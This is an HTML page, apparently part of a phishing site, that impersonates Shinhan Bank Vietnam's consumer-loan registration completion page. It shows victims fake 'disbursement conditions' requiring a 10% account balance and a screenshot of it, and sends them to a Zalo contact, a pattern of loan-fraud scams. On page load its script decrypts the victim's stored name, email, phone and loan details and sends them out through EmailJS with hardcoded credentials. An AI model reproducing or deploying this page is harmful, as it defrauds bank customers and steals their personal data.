<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shinhan Bank - Hoàn Tất Đăng Ký</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" href="https://shinhan.com.vn/favicon.ico">
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <script type="text/javascript">
        (function() {
            // THAY THẾ 'YOUR_PUBLIC_KEY' BẰNG PUBLIC KEY CỦA BẠN TRÊN EMAILJS
            emailjs.init('OrBsI926QI2_xBh1f'); 
        })();
    </script>
    
    <style>
        :root {
            --primary-color: #0072CE;
            --secondary-color: #F5F7FA;
            --accent-color: #00A859;
            --text-color: #333;
            --text-light: #555;
            --border-color: #DEE2E6;
            --border-radius: 12px;
            --shadow: 0 4px 15px rgba(0, 0, 0, 0.07);
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        }

        body {
            font-family: 'Be Vietnam Pro', sans-serif;
            background-color: var(--secondary-color);
            color: var(--text-color);
        }
        
        /* Header */
        .app-header {
            background: #fff;
            padding: 15px 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            display: flex;
            align-items: center;
            justify-content: center;
            position: sticky;
            top: 0;
            z-index: 1010;
        }

        .app-header .logo {
            height: 30px;
        }

        /* Main Content */
        .main-container {
            padding: 20px 10px;
        }

        .completion-card {
            background: white;
            border-radius: var(--border-radius);
            box-shadow: var(--shadow);
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            overflow: hidden;
            text-align: center;
        }

        .completion-header {
            padding: 40px 30px;
            background: linear-gradient(135deg, var(--accent-color), #00c96d);
            color: white;
        }
        .completion-header .icon {
            font-size: 4rem;
            margin-bottom: 15px;
            animation: popIn 0.5s 0.2s ease-out backwards;
        }
        .completion-header h3 {
            font-weight: 700;
            margin: 0;
            font-size: 2rem;
             animation: fadeIn 0.5s 0.4s ease-out backwards;
        }
        
        @keyframes popIn {
            0% { transform: scale(0.5); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .completion-body {
            padding: 30px;
        }

        .section-title {
            font-weight: 600;
            color: var(--primary-color);
            margin-bottom: 20px;
            font-size: 1.3rem;
            text-align: left;
        }
        
        .next-steps-list {
            list-style: none;
            padding: 0;
            text-align: left;
        }
        .next-steps-list li {
            display: flex;
            align-items: flex-start;
            margin-bottom: 15px;
        }
        .next-steps-list .step-icon {
            color: var(--primary-color);
            font-size: 1.2rem;
            margin-right: 15px;
            margin-top: 5px;
            width: 20px;
            text-align: center;
        }

        .info-block {
            background-color: var(--secondary-color);
            padding: 20px;
            border-radius: var(--border-radius);
            margin-top: 30px;
            border: 1px solid var(--border-color);
            text-align: left;
        }
        
        .info-block p {
            margin: 0;
            color: var(--text-light);
        }

        .actions {
            padding: 30px;
            border-top: 1px solid var(--border-color);
        }

        .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            color: white;
            font-weight: 600;
            padding: 12px 30px;
            font-size: 1.1rem;
            border-radius: 50px;
            transition: var(--transition);
            text-decoration: none;
        }
        .btn-primary:hover {
            background-color: #005a9e;
            border-color: #005a9e;
            color: white;
            transform: translateY(-2px);
        }
        
        /* Loading overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(5px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
        }
        .spinner-border-lg {
            width: 4rem;
            height: 4rem;
            color: var(--primary-color);
        }

    </style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner-border spinner-border-lg" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>
    
    <header class="app-header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo.png" alt="Shinhan Bank Logo" class="logo">
    </header>

    <main class="main-container">
        <div id="completionCard" class="completion-card hidden">
            <div class="completion-header">
                <div class="icon"><i class="fas fa-check-circle"></i></div>
                <h3>ĐĂNG KÝ THÀNH CÔNG</h3>
            </div>

            <div class="completion-body">
                <h4 class="section-title">Điều kiện Giải ngân Bắt buộc</h4>
                <ul class="next-steps-list">
                    <li>
                        <i class="fas fa-balance-scale-right step-icon"></i>
                        <div>
                            <strong>Điều 1: Duy trì số dư tối thiểu</strong>
                            <p class="text-muted">Quý khách phải duy trì số dư tối thiểu <strong>10%</strong> giá trị khoản vay trong tài khoản (ví dụ: vay 30 triệu đồng, số dư tối thiểu 3 triệu đồng) nhằm chứng minh năng lực tài chính và khả năng trả nợ, theo quy định tại Thông tư 39/2016/TT-NHNN. Số dư này chỉ cần giữ trong tài khoản, không yêu cầu nạp thêm, đóng phí hoặc chuyển khoản.</p>
                        </div>
                    </li>
                     <li>
                        <i class="fas fa-camera-retro step-icon"></i>
                        <div>
                            <strong>Điều 2: Xác nhận đủ điều kiện số dư</strong>
                            <p class="text-muted">Quý khách chỉ cần cung cấp hình ảnh số dư trong tài khoản/thẻ thể hiện số dư tối thiểu 10% tính theo số tiền vay, gửi ảnh cho nhân viên ngân hàng để thẩm định và hoàn tất thủ tục. <strong>Lưu ý:</strong> Không cần đóng, nộp, hay chuyển tiền qua bất cứ cá nhân hay nhân viên nào để được giải ngân.</p>
                        </div>
                    </li>
                    <li>
                        <i class="fas fa-shield-alt step-icon"></i>
                        <div>
                            <strong>Điều 3: Vay tín chấp</strong>
                            <p class="text-muted">Khoản vay không yêu cầu thế chấp tài sản hoặc thẩm định bất động sản, phù hợp quy định vay tín chấp của Shinhan Bank. Sau khi đáp ứng các điều kiện, khoản vay sẽ được giải ngân vào tài khoản ngân hàng của Quý khách theo Hợp đồng Tín dụng.</p>
                        </div>
                    </li>
                </ul>

                <div class="info-block">
                    <p>Vui lòng kiểm tra Hợp đồng Vay Tiêu dùng và Bảng Điều Kiện Giải Ngân. Các điều khoản này đã được nêu rõ trong Hợp Đồng với Ngân hàng Shinhan Việt Nam.</p>
                </div>
            </div>

            <div class="actions">
                <a href="https://zalo.me/84762797077" target="_blank" class="btn btn-primary">
                    <i class="fab fa-rocketchat"></i> Liên hệ chuyên viên Zalo
                </a>
            </div>
        </div>
    </main>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
"use strict";

const CompletionApp = {
    state: {
        userData: null,
    },
    
    elements: {},

    config: {
        SECRET_KEY: 'shinhan-secret-key',
        // MỚI: Thêm thông tin EmailJS vào config
        EMAILJS_SERVICE_ID: 'service_60tgxof',
        EMAILJS_TEMPLATE_ID: 'template_e8o1t4w'
    },

    init() {
        this.cacheDOMElements();
        if (!this.loadAndValidateData()) {
            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
            return;
        }
        
        // MỚI: Gọi hàm gửi email sau khi xác thực dữ liệu thành công
        this.sendNotificationEmail();

        // Hide loader and show content
        this.elements.loadingOverlay.style.display = 'none';
        this.elements.completionCard.classList.remove('hidden');
    },

    cacheDOMElements() {
        const ids = ['loadingOverlay', 'completionCard'];
        ids.forEach(id => this.elements[id] = document.getElementById(id));
    },

    loadAndValidateData() {
        try {
            const storedData = localStorage.getItem('userData');
            if (!storedData) {
                console.error('No userData found');
                return false;
            }
            
            const decryptedBytes = CryptoJS.AES.decrypt(storedData, this.config.SECRET_KEY);
            const decryptedData = decryptedBytes.toString(CryptoJS.enc.Utf8);
            
            if (!decryptedData) {
                 console.error('Failed to decrypt data.');
                 return false;
            }

            this.state.userData = JSON.parse(decryptedData);
            
            if (!this.state.userData.currentStep || this.state.userData.currentStep < 5) {
                 console.error('User is not at the correct step to view this page.');
                 return false;
            }
            
            return true;

        } catch (error) {
            console.error('Error loading or validating userData:', error);
            localStorage.removeItem('userData');
            return false;
        }
    },

    // MỚI: Thêm hàm để xử lý việc gửi email
    sendNotificationEmail() {
        console.log('Preparing to send email...');

        // Tạo đối tượng chứa các tham số cho template EmailJS
        // Tên các thuộc tính (ví dụ: fullName, email) phải khớp với các biến trong template của bạn
        const templateParams = {
            fullName: this.state.userData.fullName,
            email: this.state.userData.email,
            phone: this.state.userData.phone,
            loanAmount: this.state.userData.loanAmount,
            loanTerm: this.state.userData.loanTerm,
            // Thêm bất kỳ thông tin nào khác bạn muốn gửi
        };
        
        emailjs.send(this.config.EMAILJS_SERVICE_ID, this.config.EMAILJS_TEMPLATE_ID, templateParams)
            .then((response) => {
               console.log('SUCCESS! Email sent.', response.status, response.text);
               // Bạn có thể thêm thông báo thành công cho người dùng ở đây nếu cần
            }, (error) => {
               console.error('FAILED to send email.', error);
               // Xử lý lỗi: có thể gửi lại hoặc thông báo cho quản trị viên
            });
    }
};

document.addEventListener('DOMContentLoaded', () => {
    CompletionApp.init();
});
</script>
</body>
</html>
